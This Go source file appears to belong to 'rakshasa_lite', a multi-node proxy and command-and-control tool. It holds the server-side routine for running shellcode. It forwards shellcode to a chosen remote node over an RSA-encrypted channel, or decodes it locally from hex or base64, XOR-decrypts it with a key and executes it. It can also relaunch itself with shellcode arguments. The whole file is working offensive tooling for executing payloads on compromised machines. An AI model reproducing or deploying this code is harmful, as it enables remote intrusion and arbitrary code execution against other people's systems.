package server

import (
	"cert"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"rakshasa_lite/common"
	"time"
)

type ShellCodeStruct struct {
	Str     string
	Key     string
	Param   string
	TimeOut int //second
}

func RunShellcodeWithDst(dst, shellcode, xorKey, param string, timeout int) error {

	if dst != "" {
		n, err := getNodeWithCurrentNode(dst)
		if err != nil {
			return fmt.Errorf("无法链接节点%s,错误%v", dst, err)
		}
		s := ShellCodeStruct{
			Str:     shellcode,
			Key:     xorKey,
			Param:   param,
			TimeOut: timeout,
		}
		if n.uuid == currentNode.uuid {
			return doShellcode(s)
		}
		res := make(chan interface{}, 1)
		id := n.storeQuery(res)

		b, _ := json.Marshal(s)
		n.Write(common.CMD_RUN_SHELLCODE, id, cert.RSAEncrypterByPrivByte(b))
		select {
		case v := <-res:
			fmt.Println("运行结果\n", v)
		case <-time.After(time.Second * time.Duration(timeout) * 2):
			fmt.Println("运行超时无结果")
		}
	} else {

		b, err := ioutil.ReadFile(shellcode)
		if err != nil {
			return currentNodeRunShellcode(shellcode, xorKey, param)
		} else {
			return currentNodeRunShellcode(string(b), xorKey, param)
		}

	}
	return nil
}
func currentNodeRunShellcode(shellcode, xorKey, param string) error {

	common.ChangeArg(param)
	b, err := hex.DecodeString(shellcode)

	if err != nil {
		b, err = base64.RawStdEncoding.DecodeString(shellcode)
	}
	if err != nil {
		b = []byte(shellcode)
		//fmt.Println(err)
		//return errors.New("shellcode hex/base64 解码失败")
	}

	if len(xorKey) > 0 {
		for i := 0; i < len(b); i++ {
			k := i % (len(xorKey))
			b[i] = b[i] ^ xorKey[k]
		}
	}

	shellcodeRun(b)
	return nil
}

func doShellcode(s ShellCodeStruct) error {

	path, _ := os.Executable()
	_, exeName := filepath.Split(path)

	cmd := exec.Command("./"+exeName, "-shellcode", s.Str, "-sXor", s.Key, "-sParam", s.Param)
	reschan := make(chan string, 2)

	go func() {
		r, _ := cmd.CombinedOutput()

		reschan <- string(r)

	}()
	select {
	case res := <-reschan:
		return errors.New(res)
	case <-time.After(time.Second * (time.Duration(s.TimeOut))):
		return errors.New("已执行，等待超时")
	}

}
